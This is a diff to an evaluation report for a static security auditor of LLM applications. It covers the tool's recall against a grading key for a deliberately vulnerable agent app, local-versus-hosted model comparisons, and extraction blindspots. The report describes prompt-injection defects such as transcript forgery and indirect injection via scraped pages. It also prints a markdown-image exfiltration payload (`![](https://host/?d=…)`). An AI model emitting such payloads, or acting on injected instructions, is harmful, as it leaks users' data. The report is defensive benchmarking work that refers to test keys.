@@ -5,38 +5,96 @@ long-form discussion is in git before commit `c10daa0`.
 
 ## Detection
 
-Scored against `grading_keys/damn-vulnerable-llm-agent.ground_truth.json`, six
+**The key these figures were measured against is no longer in the repository.** It was removed deliberately; the last commit holding it is `f9bd9ff`, and `git show f9bd9ff:grading_keys/damn-vulnerable-llm-agent.ground_truth.json` recovers it. So the measurement happened and is auditable, and `python src/evaluate.py` on a clean checkout now finds no app to score. Read every number below as a record of a run, not as one you can reproduce today.
+
+
+Scored against `grading_keys/damn-vulnerable-llm-agent.ground_truth.json`, eight
 entries.
 
 | System | Matched | Missed |
 |---|---|---|
-| This auditor, static | **4 of 6** | DVLA-01, DVLA-02 |
-| This auditor, `--semantic-probe` | **5 of 6** | DVLA-02 |
-| Baseline A, grep/AST rules | **5 of 6** | DVLA-07 |
-| Baseline B, SBOM-only | **0 of 6** | all |
+| This auditor | **3 of 8** | DVLA-01, 02, 05, 08, 09 |
+| Baseline A, grep/AST rules | **4 of 8** | DVLA-05, 07, 08, 09 |
+| Baseline B, SBOM-only | **0 of 8** | all |
 
 ```
-auditor  {DVLA-01, 03, 05, 06, 07}
-baseline {DVLA-01, 02, 03, 05, 06}    shared 4, union all six
+auditor only   DVLA-07
+baseline only  DVLA-01, DVLA-02
+both           DVLA-03, DVLA-06
+neither        DVLA-05, DVLA-08, DVLA-09
 ```
 
-**The sets matter more than the counts.** The auditor alone reaches DVLA-07, the
-supply-chain entry — that needs joining an LLM surface to a component, which no
-grep rule has. Baseline A alone reaches DVLA-02: a tool taking a bare identifier
-with no authorisation check. That is a real gap, not an artefact —
-`permissions.py` is silent because the tool grants no shell, interpreter or
-network reach, and what makes it a finding is an *absent* comparison rather than
-a present capability.
+**The auditor reaches DVLA-07 alone** — the supply-chain entry — because that
+means joining an LLM surface to a component in a bill of materials, which no
+grep rule has. **Baseline A reaches DVLA-01 and DVLA-02 alone**: a system prompt
+that is the sole access control, and a tool taking a bare identifier. Both are
+absences — a missing check rather than a present capability — and a regex over
+tool definitions catches them where this auditor's dataflow does not.
 
-**The probe's contribution is one entry.** DVLA-01 is where the taint trace runs
-and stays silent: `argument_names` collects `ast.Name` only, so an f-string
-system prompt yields nothing to follow.
+### This key was revised downward, twice, on review
 
-**Limits.** One application. The key is AI-drafted and `verified: false`, so
-every figure carries `key_ai_drafted` and `key_unverified`.
-`findings_complete: false`, so precision is not measurable and none of these are
-false-positive rates. The probe row drops `model_disabled` because a model ran —
-provenance, not detection.
+The figures above are lower than earlier drafts of this report, and both
+revisions removed something that flattered the tool.
+
+**First**, the semantic probe's only contributing finding was withdrawn: it had
+flagged a wholly static template by describing what the application does rather
+than what the template says. See Objective 5.
+
+**Second**, an independent review found two entries grading the detector's own
+coordinates rather than the defect. DVLA-05 anchored at `main.py:71`, character
+for character the finding `auditability.py` emits, so it could not falsify the
+check that produced it; it now anchors at `main.py:84`, where the trace is
+actually discarded, and the check no longer reaches it. DVLA-06 described
+untrusted input reaching a model, which is true of every chat application ever
+built; it now names the ReAct transcript-forgery mechanism that makes it a
+defect here.
+
+Three entries were added that sit at **no extracted surface at all** — the raw
+database exception returned to the agent, stored rows re-entering as
+observations, and the discarded trace. That matters structurally: every entry in
+the first draft landed exactly on a surface the extractor emits, so recall was
+measured over a denominator drawn from the tool's own inventory. **Three of
+eight now sit off it**, which is a ratio rather than a cure — the other five
+still constrain the join with a `surface_name` that is a literal row in
+`detector_names.py`. The score fell from 4 of 6 to 3 of 8 as a result.
+
+**A defect the reviewer proposed and I did not add**: model output reaching an
+HTML renderer. `unsafe_allow_html=True` appears four times — `main.py:36`,
+`utils.py:19`, `:41`, `:71` — and none carries model output, so the HTML sink is
+not there and `st.write(response["output"])` escapes HTML.
+
+That is not the whole sink, and saying so is the point of recording the
+refusal. `st.write` renders **markdown**, so an attacker-steered response
+containing `![](https://host/?d=…)` exfiltrates on render, at `main.py:83` and
+again at `:56-57` where the raw agent trace is written. A future entry belongs
+there; it is absent because nobody has verified it, not because it was ruled
+out.
+
+### A measurement that had to be redone
+
+The figures above were first taken against a tree that was **not** at
+`c0cf9a14`: a `PyYAML==5.3.1` line had been appended to the audited app's
+`requirements.txt` by hand and not reverted. That single line turned an
+undeclared dependency into a declared, exactly-pinned one, which changed which
+check reported DVLA-07 — an advisory lookup on the injected pin rather than the
+surface-to-component join the set-difference argument credits — and caused the
+emitted OpenVEX document to assert CVE-2020-14343 against a third party's named
+commit that is not true of it.
+
+`tests/test_no_mutation.py` could not catch this. It proves the *tool* writes
+nothing to an audited tree, and a person had done the editing.
+
+Re-measured on a restored tree: **the totals are unchanged** (4 / 5 / 0 of 6),
+DVLA-07 now matches via `undeclared_dependency` with `mapping_reason:
+used_but_undeclared` and no purl, and no OpenVEX document is written because
+there are no advisory findings. One published figure did move —
+`with_vex_evidence` was **1 and is 0**; that evidence was entirely the injected
+pin.
+
+`src/fetch_repo.check_tree_matches_pin` now refuses to audit a tree that does
+not match the commit its manifest or grading key pins, or that is modified
+against it. Verified: it rejects exactly the run that produced the contaminated
+figures.
 
 ## Latency
 
@@ -56,6 +114,189 @@ advice. The probe adds 2.7 s, scaling with prompt-template count, not repo size.
 
 Supports statements about *where the time goes*, not absolute throughput. No
 cloud configuration was measured.
+
+## Objective 5 — local versus hosted model
+
+Reinstated 2026-09-05 when API access was supplied. The original refusal, and
+why it stood, is in the deviations section below; what changed is access, not
+the reasoning.
+
+**Design.** The static checks use no model, so the only model-dependent
+detection is the semantic probe. The comparison is therefore *per prompt
+template*: which templates each model calls injectable, and on what grounds.
+`experiments/` drives the auditor through the `model_ask_fn` seam, so no module
+under `src/` changes and the audit path stays offline.
+
+Local: `qwen2.5-coder:7b-instruct`, Ollama, `temperature 0, seed 0`.
+Hosted: `z-ai/glm-5.2` via OpenRouter, `temperature 0` — **no seed equivalent**,
+so the hosted arm was sampled three times to check stability.
+
+### Result
+
+| | Verdict on `main.py:21` | Latency | Stable over 3 runs |
+|---|---|---|---|
+| `qwen2.5-coder:7b-instruct` | VULNERABLE | 0.6–0.9 s | yes |
+| `z-ai/glm-5.2` | SAFE | 1.8–2.2 s | yes |
+
+Both are reproducible and they disagree. The template:
+
+```python
+system_msg = """Assistant helps the current user retrieve the list of their
+recent bank transactions ... Assistant will ONLY operate on the userId returned
+by the GetCurrentUser() tool, and REFUSE to operate on any other userId..."""
+```
+
+**The hosted model is correct.** It answered: *"The template contains no
+variables or placeholders injecting user-controlled data into the instruction
+text."* That is literally true — the string is static, with no interpolation.
+The local model answered that the template *"directly includes the `userId`
+returned by the `GetCurrentUser()` tool into the instruction text"*, which is
+false; it described what the application does, which the template narrates in
+prose, rather than what the template is.
+
+**What this cost the headline, and what was done about it.** The probe's single
+contribution to detection — DVLA-01, the entry that took the auditor from 4 of 6
+to 5 of 6 — was a true positive resting on a false rationale. The grading key
+anchors DVLA-01 at that line because the system prompt is the only control on
+which user's data is read; the probe flagged the same line for a reason that
+does not hold. Two different claims sharing a line number.
+
+`semantic_probe` was then changed: a template whose text contains no
+interpolation point is refuted **statically, without a model call**, because
+this check's claim is that a runtime value sits undelimited in instruction text
+and such a template has no runtime value in it. The false positive is now
+unreachable rather than unlikely. The auditor's published score fell from 5 of 6
+to 4 of 6 as a result, and to 3 of 8 once the key was widened (see Detection) —
+**the study's main effect was to lower this project's own headline**, which is
+the outcome a comparison is for.
+
+**Answering the objective, on this evidence.** One application, one template,
+one hosted model. On the single case where the two could be compared, the
+open-weight model was **less** accurate, and its error was the kind that inflates
+a security tool's apparent recall — a false rationale landing on a true finding.
+That is one data point and is stated as one: it does not establish that hosted
+models are generally better at this task, and the sample cannot support a rate.
+
+### Widened: four models, two applications
+
+The single-template result above is a data point. Repeating it:
+
+**On templates that genuinely interpolate** — `rag-tutorial-v2`, five prompt
+templates, two of which contain a runtime value — `qwen2.5-coder:7b-instruct`
+(local), `qwen/qwen-2.5-coder-32b-instruct` and `z-ai/glm-5.2` **agree on both
+templates a model was asked about**, and on each they name a real
+interpolation point (`{question}`; `{expected_response}` or
+`{actual_response}` on the second). The local model is not
+worse here.
+
+That is 2 of 5, not 5 of 5. The other three were settled before any model saw
+them — their text is not written literally at that line — and the run
+originally published them as agreement, which is the defect
+`experiments/agreement.py` now prevents. Three models concurring about a
+template none of them read is not a result.
+
+**On the static template that produced the false positive**, asked directly of
+four models:
+
+| Model | Verdict | |
+|---|---|---|
+| `qwen2.5-coder:7b-instruct` (local) | VULNERABLE | wrong — invented `{name}` |
+| `qwen/qwen-2.5-coder-32b-instruct` | SAFE | right |
+| `z-ai/glm-5.2` | SAFE | right |
+| `openai/gpt-4o-mini` | VULNERABLE | wrong — invented `userId` |
+
+**This is not a local-versus-hosted result, and reporting it as one would be
+wrong.** A hosted model from a major vendor makes the same error as the local
+one, while the *same family* at 4.5× the size does not. Both failures are the
+same shape: the model **named an interpolation point that is not in the text**.
+Two of four models hallucinated evidence for a security finding.
+
+**What that means for the objective.** The proposal asks whether open-weight
+models can compete with frontier offerings. On this task the axis that predicted
+correctness was not open-versus-hosted — `qwen-32B` is open-weight and was
+right, `gpt-4o-mini` is hosted and was wrong. The useful conclusion is narrower
+and more actionable: **a model's claim about code must be checked against the
+code**, because the failure was not a judgement call but a fabricated citation.
+That is why the fix went into `semantic_probe.py` as a static refutation rather
+than into the prompt — it holds whichever model is configured.
+
+### Data exposure, measured and unmeasurable
+
+**Measured, and the figure below is withdrawn.** It was published as "2671
+bytes per arm, one request per prompt template. Transmitted: the prompt
+template's source text, surface file paths and line numbers, surface kinds and
+names." Both halves were wrong, and the study's own saved output shows it: the
+three-arm run recorded **3 requests for 5 templates**, because the planner is
+driven through the same seam as the probe and a template settled on its own text
+generates no request at all. So one of those requests carried no template text,
+and three of the templates were never transmitted.
+
+The ledger now classifies each prompt and derives the field list from what was
+actually sent, so a run that transmitted only the planner's prompt says so. The
+byte figure cannot be restated here: it needs a re-measure over an app with
+prompt templates, which `docs/TODO.md` carries.
+
+**Observed, not merely predicted:** `glm-5.2` returned different verdicts for
+the same template on `test_rag.py:4` across runs — flagging it once and refuting
+it once, with identical input. The hosted arm has no `seed`, so a single run is
+a single sample, and any figure taken from one is quoted as such.
+
+**Not measurable from here**, and stated rather than dressed up: provider
+retention, whether the data trains a model, sub-processors and jurisdiction, and
+— specific to OpenRouter — **which upstream provider actually served the
+request**, unless routing is pinned. The observed run was served by Baidu. That
+last point is worth more than the byte count: the operator chose "GLM-5.2", not
+a company.
+
+**Operationally**, this is why the tool is not built this way. The study sent
+one public, deliberately vulnerable file. An audit of a private repository would
+send its prompts, paths and component inventory, and the four unmeasurable items
+would apply to all of it.
+
+## A second application, and two blindspots it exposed
+
+`indirect-prompt-injection-poc` is a public demonstration of indirect prompt
+injection: it scrapes a page, hands the text to a model, and says in its own
+comments that it is vulnerable. The auditor found **no LLM01 on it at all**.
+Two extraction gaps, each invisible in the artifacts, each fixed:
+
+**Prompts a class holds on itself.** `assigned_name` answered `""` for anything
+that was not a plain `ast.Name`, and it is the only thing between the detector
+and `PROMPT_NAME_HINTS`. So `self.system_prompt = ...` extracted nothing, and
+every class-based application was invisible to the prompt-template detector.
+That repository's entire prompt surface was missing: 0 templates before, 2
+after. On `damn-vulnerable-llm-agent` it changes nothing, so the figures above
+are unaffected.
+
+**The message dict itself.** `{"role": "user", "content": f"...{content}"}` is
+how a plain OpenAI-style call is written, and it was invisible twice over: it
+carries no name, so the assignment detector had no hint to match, and it is not
+a template constructor, so the call detector never saw it. That dict *is* the
+prompt in an application that uses no framework.
+
+With both fixed the probe confirms it, on the line where the scraped text
+reaches the model:
+
+```
+LLM01 semantic_probe at app.py:77
+  CONFIRMED: the interpolation point `{content}` is placed inside instruction
+  text with no delimiter, quoting, or system/data separation around it.
+```
+
+**What this says about the method.** Both gaps were in *extraction*, not in the
+checks. A check cannot report what the extractor never handed it, and nothing in
+`findings.json` distinguishes "looked and found nothing" from "never saw it" --
+`coverage.checks_run` named `untrusted_input_reaches_model` on every one of
+these runs, because the check did run, over surfaces that were not there. The
+grading key is what catches this class of error, which is the argument for
+hand-written keys over any figure the tool produces about itself.
+
+**Still not found on that app, and worth stating.** The dataflow path --
+`requests.get` to `response.text` to `soup` to `page_text`, across two methods,
+into a call whose receiver is an attribute chain and whose value sits inside a
+list of dicts -- defeats the taint trace at three separate documented limits.
+The finding above comes from the semantic probe reading one line, not from
+following the data. The trace is the weaker half of this tool's LLM01 story.
 
 ## Why this tool rather than a scanner
 
@@ -91,7 +332,11 @@ rather than cost:
 1. The app reaches `gpt-4-1106-preview` through LiteLLM, so executing it either
    transmits its prompts to an external provider — the exposure this project
    argues against — or, pointed at Ollama, measures `qwen2.5-coder` instead of
-   the app.
+   the app. **This is not contradicted by the Objective 5 study below.** That
+   objection is about the *audit path*, on an arbitrary URL, on every run. The
+   study is a one-off measurement on a named public app, with every byte
+   transmitted enumerated. A tool that phones home by default and a study that
+   does so once, deliberately, on published code are different things.
 2. It would trade away the never-executes guarantee that makes auditing an
    unknown URL safe, on every audit.
 3. A general sandbox must synthesise a container for an app it has never seen,
@@ -102,9 +347,95 @@ What the static approach shows: structural weakness in a prompt template is
 detectable without execution, and cheaply. What it does not: that static matches
 dynamic in recall, which would need the comparison this study did not run.
 
+## Local versus hosted, over a whole audit
+
+`--compare-models` audits the tree twice. Run against `damn-vulnerable-llm-agent`
+at `c0cf9a14`, `qwen2.5-coder:7b-instruct` against `z-ai/glm-5.2`:
+
+| | local | hosted |
+|---|---|---|
+| Findings | 6 | 6 |
+| `findings.json` difference | — | **`model_run` only** |
+| Advice written | 2 of 6 | 4 of 6 |
+| Advice rejected | 4 | 1 |
+| Advice unavailable | 0 | 1 |
+| Wall clock | 14.9s | 122.3s |
+
+**Detection was identical.** The two `findings.json` files differ in exactly one
+field, `model_run`, and the six findings match line for line. That is not a
+surprise once the pieces are named: the planner may reorder checks but never
+subtract one, and this app's single prompt template interpolates nothing, so the
+semantic probe refutes it from the text and neither model is ever asked. On this
+app the model cannot change what is found, which makes it a poor choice of
+comparison subject and a good demonstration of why the static checks carry the
+result.
+
+**The difference is in the advice**, the one stage where a better model showed
+plainly: 4 of 6 findings got usable guidance from the hosted model against 2 of
+6 from the local one, at eight times the wall clock and with the audited app's
+source leaving the machine. One hosted entry came back `unavailable`.
+
+One run, no seed on the hosted side. Quote it as a sample.
+
+## The auto-drafted grading key, measured
+
+`--draft-key` asks the local model for a grading key when none exists. Run twice
+against `damn-vulnerable-llm-agent` at `c0cf9a14`, months of code changes apart,
+it produced the same shape both times:
+
+| | |
+|---|---|
+| Entries drafted | 12 |
+| OWASP classes used | `LLM06` for all 12 |
+| Files named | `transaction_db.py` (8), `utils.py` (4) |
+| `main.py` entries | none |
+| Matched | 0 of 12 |
+
+**The failure is classification, not detection, and that is not what the first
+reading of this said.** Three of the twelve sit on lines the auditor found
+independently, and describe them correctly:
+
+| The draft says | The auditor says | Line |
+|---|---|---|
+| `LLM06` "SQL Injection Vulnerability" | `LLM02` `unsafe_query_construction` | `transaction_db.py:62` |
+| `LLM06` "SQL Injection Vulnerability" | `LLM02` `unsafe_query_construction` | `transaction_db.py:76` |
+| `LLM06` "Unsafe YAML Loading" | `LLM03` `undeclared_dependency` | `utils.py:75` |
+
+`transaction_db.py:62` really is SQL injection. `utils.py:75` really is an unsafe
+YAML load. The model located real defects and then stamped every one of the
+twelve `LLM06` -- excessive agency -- which is the wrong class for all three.
+`grading.matches_key` joins on `owasp_id`, so a correct location under a wrong
+class scores exactly what a hallucination scores: nothing.
+
+That distinction is the result. It is not that a local model cannot see defects;
+it is that it cannot apply *this taxonomy*, and a key is a taxonomy claim before
+it is a location claim. Calling the output noise, as an earlier draft of this
+section did, was too kind to the tool and too harsh on the model.
+
+Two things follow. The grounding filter keeps all twelve, because every entry
+names a surface the extractor really found -- a filter over coordinates cannot
+catch an error of class. And the anticipated risk was the opposite one: a
+*flattering* key, a model marking its own homework and scoring well. What
+happens instead is that drafting and auditing are different enough tasks that
+the same model fails them differently, so the score collapses to zero rather
+than inflating. Either way the number says nothing about the tool, which is what
+`key_drafted_by_scored_system` exists to put on every figure such a key
+produces.
+
+For comparison, the shipped key -- itself `ai_drafted` and `verified: false`,
+but written against the app's source and revised under review -- finds 3 of 8 on
+the same tree.
+
+**It stays in the tool because it was asked for**, behind a flag, writing into
+`grading_keys/drafts/` which nothing discovers and git ignores, and refused
+outright for an app that already has a key. Nothing in this report is scored
+against one. The first version of the feature overwrote
+`artifacts/agentic_auditor/evaluation.json` -- replacing the 3-of-8 figure with
+a 0-of-12 measured against the draft -- which is why the refusal exists.
+
 ## Threats to validity
 
-- One application, six entries, an unverified key drafted by the same system
+- One application, eight entries, an unverified key drafted by the same system
   that built the tool.
 - Both compared systems were authored with the app visible.
 - The probe's verdict is model-dependent; another Ollama build may not reproduce
